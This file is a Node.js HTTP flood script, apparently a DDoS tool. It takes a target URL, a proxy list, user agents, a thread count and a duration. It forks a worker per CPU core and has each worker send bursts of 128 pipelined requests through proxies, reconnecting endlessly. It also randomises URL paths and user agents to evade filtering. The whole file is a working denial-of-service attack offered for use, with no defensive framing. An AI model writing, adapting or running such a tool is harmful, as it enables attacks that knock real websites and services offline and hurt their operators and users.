#!/usr/bin/node
const cluster = require('cluster');
const fs = require('fs');
const net = require('net');
const url = require('url');
const os = require('os');

const USAGE_ARGS =
    '<url> <method> <useragents> <proxies> <threads> <duration>';
const ARGS_LEN = 6;

if (cluster.isMaster) {
  let argv = process.argv.slice(1);
  if (argv.length+1 < ARGS_LEN) {
      console.log(`usage: node ${argv[0]} ${USAGE_ARGS}`);
      process.exit(0);
  }
  let method = argv[2];
  let useragents = fs.readFileSync(argv[3], 'utf-8').match(/.+/g);
  let proxies = fs.readFileSync(argv[4], 'utf-8').match(/.+/g);
  let threads = parseInt(argv[5]);
  let duration = parseInt(argv[6]);

  let proxiesAmount = proxies.length;
  let cpuAmount = require('os').cpus().length;

  let proxiesGroups = [];
  for (let i = 0; i < cpuAmount; i++)
    proxiesGroups[i] = [];
  for (let i = 0; i < proxiesAmount; i++)
    proxiesGroups[i % cpuAmount].push(proxies[i]);

  let workers = {};

  for (let i = 0; i < cpuAmount; i++) {


  let xd = argv[1];
  let serpicogay =  Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  let theurl = xd.replace("%RAND%", serpicogay);
  let target = new url.URL(theurl);
  
      let worker = cluster.fork();
      let proxies = proxiesGroups[i];
      workers[worker.id] = proxies;

      worker.send({
          target,
          method,
          useragents,
          proxies,
          threads,
      });
  }

    cluster.on('exit', function(worker) {
        console.log(`worker ${worker.id} died`);

        let proxies = workers[worker.id];
        delete workers[worker.id];

        worker = cluster.fork();
        workers[worker.id] = proxies;

        worker.send({
            target,
            method,
            useragents,
            proxies,
            threads,
        });
    });

    setTimeout(function() {
        process.exit(0);
    }, duration * 1000);
} else {
    function randomInt(max) {
        let rand = Math.random() * Math.ceil(max);
        rand = Math.ceil(rand);
        return rand;
    }

    function randomChoice(arr) {
        return arr[randomInt(arr.length)];
    }

    function buildRequest(method, target, useragent) {
        let request = `${method} ${target.href} HTTP/1.1\r\n` +
            `Host: ${target.host}\r\n` +
            `User-Agent: ${useragent}\r\n` +
            `knockknock: synergy\r\n` +
            '\r\n';
        return request;
    }

    function startAttack(config) {
        let target = config.target;
        let method = config.method;
        let useragents = config.useragents;
        let proxy = config.proxy;

        let socket = net.connect({
            host: proxy.hostname,
            port: proxy.port || 80,
        }, () => {
            for (let j = 0; j < 128; j++) {
                let useragent = randomChoice(useragents);
                let request = buildRequest(method, target, useragent);
                socket.write(request);
            }
        });

        socket.once('close', () => startAttack(config));

        socket.once('error', () => {});
    }

    process.on('message', data => {
        let target = new url.URL(data.target);
        let method = data.method;
        let useragents = data.useragents;
        let proxies = data.proxies;
        let threads = data.threads;

        proxies.forEach(async proxyUri => {
            let proxy = new url.URL('http://' + proxyUri);
            for (let i = 0; i < threads; i++) {
                startAttack({
                    target,
                    method,
                    useragents,
                    proxy,
                });
            }
        });
    });
}
